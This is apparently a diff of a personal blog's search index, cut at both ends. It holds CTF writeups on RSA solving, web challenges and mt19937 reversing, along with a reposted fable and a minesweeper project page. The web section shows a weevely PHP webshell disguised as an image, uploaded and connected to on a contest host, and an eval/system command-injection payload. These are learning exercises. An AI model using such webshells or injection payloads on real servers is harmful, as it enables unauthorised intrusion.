class="number">7</span>)[<span class="number">1</span>] == <span class="literal">True</span>:</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(gmpy2.iroot(m + i * n, <span class="number">7</span>)[<span class="number">0</span>]))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">c = res = <span class="built_in">str</span>(<span class="built_in">hex</span>(same_n_attack(n,e1,e2,c1,c2)))[<span class="number">2</span>:-<span class="number">128</span>]</span><br><span class="line"><span class="built_in">print</span> res</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(res),<span class="number">2</span>):</span><br><span class="line">  ch = res[i]+res[i+<span class="number">1</span>]</span><br><span class="line">  flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(ch,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure>
-<p><strong>flag{8ac9f9e3-82ba-ff7e-ac7b-235a02d891ef}</strong></p>
-</blockquote>
-<h2 id="6-结局"><a href="#6-结局" class="headerlink" title="6. 结局"></a>6. 结局</h2><p>谁知道py的不止一个，而且越往后名次掉的越快（真卷），在比赛结束前30s，我的名次成功从rk24掉到了rk25，成功错失了进线下赛的资格（其实也好，反正我线下啥也不会，只会自闭）。</p>
-<p>但是，这种曲线也太**了吧。</p>
-<p><img src="/2021/09/25/ctf02/c.png"></p>
-<p><del>希望自己不被发现，前面踢掉一个。</del></p>
-<h2 id="7-等re2与misc2出来再补"><a href="#7-等re2与misc2出来再补" class="headerlink" title="7. 等re2与misc2出来再补"></a>7. 等re2与misc2出来再补</h2><h2 id="8-updated-on-10-2"><a href="#8-updated-on-10-2" class="headerlink" title="8. (updated on 10.2)"></a>8. (updated on 10.2)</h2><p>好家伙，我居然进线下赛了。</p>
-<p>本来以为是因为前面有人没写wp或者py被发现，被踢了。结果是因为23~26名分数都一样，于是就都进了。</p>
-<p>比赛时间10.16~10.17，刚好可以逃掉寝室文化节的大寝表演，快哉快哉！</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>python</tag>
-        <tag>crypto</tag>
-        <tag>reverse</tag>
-        <tag>cpp</tag>
       </tags>
   </entry>
   <entry>
@@ -1233,89 +1233,6 @@
       </categories>
   </entry>
   <entry>
-    <title>四川大学CTF实训杯wp</title>
-    <url>/2022/07/21/easiestctf.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>就是课上讲的那点东西，比我一年前备战校测的内容还要简单。</p>
-<span id="more"></span>
-<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Easy-Flag"><a href="#Easy-Flag" class="headerlink" title="Easy_Flag"></a>Easy_Flag</h3><p>ctrl+u，查看源代码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;&quot;</span> <span class="attr">content</span>=<span class="string">&quot;&quot;</span>  <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">空空如也～</span><br><span class="line"><span class="comment">&lt;!--flag.php--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">oncontextmenu</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        event.<span class="property">returnValue</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&#x27;想看代码？&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">   </span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">onkeydown</span> = <span class="variable language_">document</span>.<span class="property">onkeyup</span> = <span class="variable language_">document</span>.<span class="property">onkeypress</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> e = event || <span class="variable language_">window</span>.<span class="property">event</span> || <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>.<span class="property">arguments</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (e &amp;&amp; e.<span class="property">keyCode</span> == <span class="number">123</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            e.<span class="property">returnValue</span> = <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&#x27;没想到吧，这也不行？&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>按照提示查看/flag.php即可。</p>
-<h3 id="Easy-Button"><a href="#Easy-Button" class="headerlink" title="Easy_Button"></a>Easy_Button</h3><p>f12将<code>maxlength</code>改为50，hackbar里面随便post一个手机号。</p>
-<p>如<code>phone=12312312312</code></p>
-<h3 id="Easy-Browser"><a href="#Easy-Browser" class="headerlink" title="Easy_Browser"></a>Easy_Browser</h3><p>查看源码：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    页面什么也没有</span><br><span class="line">    <span class="comment">&lt;!--看看cookie里有什么--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>按照提示查看cookie</p>
-<p><img src="/2022/07/21/easiestctf/1.png"></p>
-<p>访问/get.php，要求提交一个参数名为flag，参数值为1的数据。</p>
-<p><code>/get.php?flag=1</code></p>
-<h3 id="旋转的木马"><a href="#旋转的木马" class="headerlink" title="旋转的木马"></a>旋转的木马</h3><p>盲猜upload.php，发现提供了上传图片的按钮。</p>
-<p>我这里是linux，没法装蚁剑，这里使用weevely。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">weevely generate 1234 ./114514.php</span><br><span class="line">mv 114514.php 114514.jpg</span><br></pre></td></tr></table></figure>
-<p>提交时使用burp抓包，将后缀再改回php即可。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">weevely http://47.116.24.9:81/upload/114514.php 1234</span><br></pre></td></tr></table></figure>
-<p>进入shell之后</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat flag_859421239.txt</span><br></pre></td></tr></table></figure>
-<h3 id="抽奖游戏"><a href="#抽奖游戏" class="headerlink" title="抽奖游戏"></a>抽奖游戏</h3><p>抽奖之后抓包：</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ctf4/check.php?tar=12&amp;sign=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.116.24.9</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.116.24.9/ctf4/game.html</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>sign=md5(tar)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
-<p>盲猜<code>tar=flag</code>，然后<code>sign=md5(&#39;flag&#39;)=327a6c4304ad5938eaf0efb6cc3e53dc</code></p>
-<p>把<code>GET</code>参数修改后提交即可。</p>
-<h3 id="Rceeeee"><a href="#Rceeeee" class="headerlink" title="Rceeeee"></a>Rceeeee</h3><p>过滤逃逸：     </p>
-<p><code>?data=eval($_GET[1]);&amp;1=system(&#39;ls&#39;);</code>            </p>
-<p>剩下的自己看着办。</p>
-<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="葫芦娃"><a href="#葫芦娃" class="headerlink" title="葫芦娃"></a>葫芦娃</h3><p>解压后改png图片高度。</p>
-<p><img src="/2022/07/21/easiestctf/2.png"></p>
-<h3 id="File-Error"><a href="#File-Error" class="headerlink" title="File_Error"></a>File_Error</h3><p>这是一个zip文件，是一个伪加密。</p>
-<p><img src="/2022/07/21/easiestctf/3.png"></p>
-<h3 id="shark"><a href="#shark" class="headerlink" title="shark"></a>shark</h3><p>题目说flag只靠搜，那就直接搜呗。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat webone.pcap | grep -a flag</span><br></pre></td></tr></table></figure>
-<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>urldecode</p>
-<p><a href="https://www.urldecoder.io/">https://www.urldecoder.io/</a></p>
-<h3 id="栅栏围墙"><a href="#栅栏围墙" class="headerlink" title="栅栏围墙"></a>栅栏围墙</h3><p>栅栏密码</p>
-<p><a href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">https://www.qqxiuzi.cn/bianma/zhalanmima.php</a></p>
-<p>每组字数9</p>
-<h3 id="罗密欧与朱丽叶"><a href="#罗密欧与朱丽叶" class="headerlink" title="罗密欧与朱丽叶"></a>罗密欧与朱丽叶</h3><p>盲文密码、猪圈密码和圣堂武士密码的结合，一个一个解就行。</p>
-]]></content>
-      <categories>
-        <category>ctf</category>
-      </categories>
-      <tags>
-        <tag>crypto</tag>
-        <tag>misc</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>（转载）撸羊毛</title>
-    <url>/2022/01/05/fable.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote>
-<p>作者：齐辛格尔<br>链接：<a href="https://www.zhihu.com/question/489610689/answer/2150453989">https://www.zhihu.com/question/489610689/answer/2150453989</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-</blockquote>
-<p>羊已经三十岁了，娶了一只母羊，准备在自家地里盖房子，想生几只小羊。</p>
-<p>老虎看见了，就对羊说，这块地是老虎的，不许私自盖房子，要住自己去买。</p>
-<p>狐狸听说了这件事，于是送了老虎几块肉，用一百金条买了这块地并且建房子，但房子建好后要卖一千金条。</p>
-<p>羊只有十块金条，买不起这个房子。</p>
-<p>狼看见了，拿着一千金条去找羊，说可以借这一千金条给他，分三十年还完，但是每年羊需要付四块金条的利息。</p>
-<p>于是羊拿着这一千金条去找狐狸买了房子。</p>
-<p>但是，羊没有生出小羊。</p>
-<p>因为每年要还狼的利息而不停被人薅羊毛，天天感冒，身体很差，导致生不出小羊。</p>
-<p>三十年过去了，羊头发白了，也老了，小羊一直没生出来，房子也不值钱了。但是老虎，狐狸和狼都赚了很多金条，生了很多小老虎小狐狸和小狼。</p>
-<p>一天，他们相约一起去河边游泳，对着鳄鱼说：“你看看我们部落多富裕，我们家的小老虎小狐狸和小狼都喂得白白胖胖的”。</p>
-<p>鳄鱼看了很不屑，带着自己的几十只鳄鱼宝宝噗通噗通跳进河里了，并且说：“你们别得意得太早，你们的宝宝很快就要饿死了，因为羊生不出羊宝宝，他们没肉吃迟早饿死！而我至少可以吃河里的鱼，永远饿不死！”</p>
-<p>一语惊醒梦中虎，老虎害怕极了，赶紧急匆匆辞别狐狸和狼两家，回到部落里。</p>
-<p>老虎赶紧对羊说，这个房子不收你的钱了，你赶紧生羊宝宝吧。</p>
-<p>老羊抱着母羊，老泪纵横，叹了一口气，说：“老虎大人，您可能有所不知，我们已经老了，生不出羊宝宝了”。</p>
-<p>老虎急得像热锅上的蚂蚁，但又没有办法，只有让羊不分白天黑夜生产羊毛去别的部落换肉吃，终于，二十年后老羊和母羊都老死了。</p>
-<p>这时，几只小老虎也长大了，但是每天都饿着肚子，老虎爸爸看了，叹了一口气，把狐狸和狼都邀请到家里来。</p>
-<p>但是狐狸说有急事，连夜拖家带口变成鳄鱼逃到河里去了。</p>
-<p>狼跟自己老伴商量，带好金条准备送给老虎，但是老虎收了金条后，把狼老两口都咬死，喂给了小老虎吃。</p>
-<p>说也奇怪，自从老狼死后，它们的小狼中，有几只也长出了羊毛。</p>
-<p>欲知后事如何，且听下回分解。</p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
     <title>（转载）高考零分作文《无与伦比的二货老师》</title>
     <url>/2022/02/09/full_mark_composition.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>转载于<a href="https://zhuanlan.zhihu.com/p/383059348">https://zhuanlan.zhihu.com/p/383059348</a></p>
@@ -1396,23 +1313,6 @@
       </categories>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2022/08/25/hello-world.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! <del>This is your very first post.</del> Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>test</category>
-      </categories>
-  </entry>
-  <entry>
     <title>猜数游戏</title>
     <url>/2021/08/27/guess.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>又是闲来无事，我扒出了竞赛时自己亲手编写的猜数游戏代码，并未对其进行改良，将网上流行的版本与小学数学结合起来，形成了如下代码。</p>
@@ -1433,35 +1333,6 @@
 ]]></content>
       <categories>
         <category>OI</category>
-      </categories>
-      <tags>
-        <tag>cpp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>游戏项目之简易扫雷</title>
-    <url>/2021/12/28/minesweep.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本项目是程序设计课程中的游戏项目。</p>
-<p>github链接：<a href="https://github.com/junyu33/MineSweep/">https://github.com/junyu33/MineSweep/</a></p>
-<p>欢迎大家提issue和pull request</p>
-<span id="more"></span>
-<h1 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h1><p>1）本项目是一个基于EGE图形库的扫雷游戏。</p>
-<p>2）本项目的功能说明：</p>
-<p>   ①简单、普通、困难、自定义四种模式</p>
-<p>   ②前三种模式的时间排行榜（文件归档）</p>
-<p>   ③快速扫雷与快速插旗</p>
-<p>   ④同时支持鼠标和键盘操作</p>
-<p>   ⑤游戏背景音乐的播放和控制 </p>
-<p>3）本项目的开发环境和工具</p>
-<p>   开发环境：vscode mingw 8.1.0</p>
-<p>   工具：ege20.08</p>
-<h2 id="游戏截图"><a href="#游戏截图" class="headerlink" title="游戏截图"></a>游戏截图</h2><p><a href="https://imgtu.com/i/TnFiAe"><img src="https://s4.ax1x.com/2021/12/20/TnFiAe.png" alt="TnFiAe.png" style="zoom: 67%;"></a></p>
-<h1 id="Changelog"><a href="#Changelog" class="headerlink" title="Changelog"></a>Changelog</h1><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1.0</span></span><br><span class="line">(source code)</span><br><span class="line"><span class="number">2.0</span></span><br><span class="line">configuration interface (ok)</span><br><span class="line">mine-generating xp-&gt;win7 mode (ok)</span><br><span class="line">basic keyboard support (ok)</span><br><span class="line"><span class="number">2.1</span></span><br><span class="line">timing (ok)</span><br><span class="line">minecnt (ok)</span><br><span class="line"><span class="number">2.2</span></span><br><span class="line">winning interface with personal things (ok)</span><br><span class="line">fast-sweeping keyboard support (ok)</span><br><span class="line">highlight numbers (ok)</span><br><span class="line">small changes about lastx,lasty (ok)</span><br><span class="line"><span class="number">3.0</span></span><br><span class="line">leaderboard (ok)</span><br><span class="line">three modes (ok)</span><br><span class="line"><span class="number">3.1</span></span><br><span class="line">quit in <span class="selector-tag">menu</span> (ok)</span><br><span class="line">add fast-flaggging (keyboard only) (ok)</span><br><span class="line">lowlight blanks (keyboard only) (ok)</span><br><span class="line"><span class="number">3.2</span></span><br><span class="line">add colors to numbers (ok)</span><br><span class="line">random block to start (ok)</span><br></pre></td></tr></table></figure>
-<h1 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a>模块划分</h1><p><a href="https://imgtu.com/i/TrfvL9"><img src="https://s4.ax1x.com/2021/12/28/TrfvL9.png" alt="TrfvL9.png"></a></p>
-<h1 id="函数调用关系"><a href="#函数调用关系" class="headerlink" title="函数调用关系"></a>函数调用关系</h1><p><a href="https://imgtu.com/i/TrfzZR"><img src="https://s4.ax1x.com/2021/12/28/TrfzZR.png" alt="TrfzZR.png"></a></p>
-]]></content>
-      <categories>
-        <category>develop</category>
       </categories>
       <tags>
         <tag>cpp</tag>
@@ -1518,6 +1389,92 @@
       <categories>
         <category>随笔</category>
       </categories>
+  </entry>
+  <entry>
+    <title>游戏项目之简易扫雷</title>
+    <url>/2021/12/28/minesweep.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本项目是程序设计课程中的游戏项目。</p>
+<p>github链接：<a href="https://github.com/junyu33/MineSweep/">https://github.com/junyu33/MineSweep/</a></p>
+<p>欢迎大家提issue和pull request</p>
+<span id="more"></span>
+<h1 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h1><p>1）本项目是一个基于EGE图形库的扫雷游戏。</p>
+<p>2）本项目的功能说明：</p>
+<p>   ①简单、普通、困难、自定义四种模式</p>
+<p>   ②前三种模式的时间排行榜（文件归档）</p>
+<p>   ③快速扫雷与快速插旗</p>
+<p>   ④同时支持鼠标和键盘操作</p>
+<p>   ⑤游戏背景音乐的播放和控制 </p>
+<p>3）本项目的开发环境和工具</p>
+<p>   开发环境：vscode mingw 8.1.0</p>
+<p>   工具：ege20.08</p>
+<h2 id="游戏截图"><a href="#游戏截图" class="headerlink" title="游戏截图"></a>游戏截图</h2><p><a href="https://imgtu.com/i/TnFiAe"><img src="https://s4.ax1x.com/2021/12/20/TnFiAe.png" alt="TnFiAe.png" style="zoom: 67%;"></a></p>
+<h1 id="Changelog"><a href="#Changelog" class="headerlink" title="Changelog"></a>Changelog</h1><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="number">1.0</span></span><br><span class="line">(source code)</span><br><span class="line"><span class="number">2.0</span></span><br><span class="line">configuration interface (ok)</span><br><span class="line">mine-generating xp-&gt;win7 mode (ok)</span><br><span class="line">basic keyboard support (ok)</span><br><span class="line"><span class="number">2.1</span></span><br><span class="line">timing (ok)</span><br><span class="line">minecnt (ok)</span><br><span class="line"><span class="number">2.2</span></span><br><span class="line">winning interface with personal things (ok)</span><br><span class="line">fast-sweeping keyboard support (ok)</span><br><span class="line">highlight numbers (ok)</span><br><span class="line">small changes about lastx,lasty (ok)</span><br><span class="line"><span class="number">3.0</span></span><br><span class="line">leaderboard (ok)</span><br><span class="line">three modes (ok)</span><br><span class="line"><span class="number">3.1</span></span><br><span class="line">quit in <span class="selector-tag">menu</span> (ok)</span><br><span class="line">add fast-flaggging (keyboard only) (ok)</span><br><span class="line">lowlight blanks (keyboard only) (ok)</span><br><span class="line"><span class="number">3.2</span></span><br><span class="line">add colors to numbers (ok)</span><br><span class="line">random block to start (ok)</span><br></pre></td></tr></table></figure>
+<h1 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a>模块划分</h1><p><a href="https://imgtu.com/i/TrfvL9"><img src="https://s4.ax1x.com/2021/12/28/TrfvL9.png" alt="TrfvL9.png"></a></p>
+<h1 id="函数调用关系"><a href="#函数调用关系" class="headerlink" title="函数调用关系"></a>函数调用关系</h1><p><a href="https://imgtu.com/i/TrfzZR"><img src="https://s4.ax1x.com/2021/12/28/TrfzZR.png" alt="TrfzZR.png"></a></p>
+]]></content>
+      <categories>
+        <category>develop</category>
+      </categories>
+      <tags>
+        <tag>cpp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>（转载）撸羊毛</title>
+    <url>/2022/01/05/fable.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote>
+<p>作者：齐辛格尔<br>链接：<a href="https://www.zhihu.com/question/489610689/answer/2150453989">https://www.zhihu.com/question/489610689/answer/2150453989</a><br>来源：知乎<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
+</blockquote>
+<p>羊已经三十岁了，娶了一只母羊，准备在自家地里盖房子，想生几只小羊。</p>
+<p>老虎看见了，就对羊说，这块地是老虎的，不许私自盖房子，要住自己去买。</p>
+<p>狐狸听说了这件事，于是送了老虎几块肉，用一百金条买了这块地并且建房子，但房子建好后要卖一千金条。</p>
+<p>羊只有十块金条，买不起这个房子。</p>
+<p>狼看见了，拿着一千金条去找羊，说可以借这一千金条给他，分三十年还完，但是每年羊需要付四块金条的利息。</p>
+<p>于是羊拿着这一千金条去找狐狸买了房子。</p>
+<p>但是，羊没有生出小羊。</p>
+<p>因为每年要还狼的利息而不停被人薅羊毛，天天感冒，身体很差，导致生不出小羊。</p>
+<p>三十年过去了，羊头发白了，也老了，小羊一直没生出来，房子也不值钱了。但是老虎，狐狸和狼都赚了很多金条，生了很多小老虎小狐狸和小狼。</p>
+<p>一天，他们相约一起去河边游泳，对着鳄鱼说：“你看看我们部落多富裕，我们家的小老虎小狐狸和小狼都喂得白白胖胖的”。</p>
+<p>鳄鱼看了很不屑，带着自己的几十只鳄鱼宝宝噗通噗通跳进河里了，并且说：“你们别得意得太早，你们的宝宝很快就要饿死了，因为羊生不出羊宝宝，他们没肉吃迟早饿死！而我至少可以吃河里的鱼，永远饿不死！”</p>
+<p>一语惊醒梦中虎，老虎害怕极了，赶紧急匆匆辞别狐狸和狼两家，回到部落里。</p>
+<p>老虎赶紧对羊说，这个房子不收你的钱了，你赶紧生羊宝宝吧。</p>
+<p>老羊抱着母羊，老泪纵横，叹了一口气，说：“老虎大人，您可能有所不知，我们已经老了，生不出羊宝宝了”。</p>
+<p>老虎急得像热锅上的蚂蚁，但又没有办法，只有让羊不分白天黑夜生产羊毛去别的部落换肉吃，终于，二十年后老羊和母羊都老死了。</p>
+<p>这时，几只小老虎也长大了，但是每天都饿着肚子，老虎爸爸看了，叹了一口气，把狐狸和狼都邀请到家里来。</p>
+<p>但是狐狸说有急事，连夜拖家带口变成鳄鱼逃到河里去了。</p>
+<p>狼跟自己老伴商量，带好金条准备送给老虎，但是老虎收了金条后，把狼老两口都咬死，喂给了小老虎吃。</p>
+<p>说也奇怪，自从老狼死后，它们的小狼中，有几只也长出了羊毛。</p>
+<p>欲知后事如何，且听下回分解。</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>广义mt19937随机数逆向</title>
+    <url>/2022/01/22/mt19937_expand.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="题意简述"><a href="#题意简述" class="headerlink" title="题意简述"></a>题意简述</h1><p>给出mt19937中的10个参数$ N、M、A、U、S、B、T、C、L、F $，并给出<strong>刚刚生成</strong>的前$ N $个伪随机数，求出伪随机数对应的种子seed。</p>
+<span id="more"></span>
+<h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><h2 id="20pts"><a href="#20pts" class="headerlink" title="20pts"></a>20pts</h2><p>暴力枚举seed即可，代码略。</p>
+<h2 id="100pts"><a href="#100pts" class="headerlink" title="100pts"></a>100pts</h2><p>做法的大致思路是：生成的随机数→<code>twist</code>后的<code>state</code>→<code>twist</code>前可能的<code>state[-1]</code>→求得seed</p>
+<p>我们先考虑标准情况，也就是参数与论文完全一致的时候，这里有一篇<a href="http://blog.tolinchan.xyz/2021/07/27/%E6%A2%85%E6%A3%AE%E6%97%8B%E8%BD%AC%E7%AE%97%E6%B3%95%E7%A0%94%E7%A9%B6/">现成的题解</a>。</p>
+<p>具体原理这里就不阐释了，给的链接和<a href="https://mivik.gitee.io/2020/solution/mivik-newbie-and-chinos-contest-2020-solution-amegura/">Mivik的题解</a>叙述得很清楚。</p>
+<p>然后当$A$的首位不为1时，就不能直接通过<code>tmp</code>的首位判断原来的<code>tmp</code>是不是奇数了。</p>
+<p>原题解中逆向<code>twist</code>的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">backtrace</span>(<span class="params">cur</span>):</span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">623</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i]^state[(i+<span class="number">397</span>)%<span class="number">624</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest 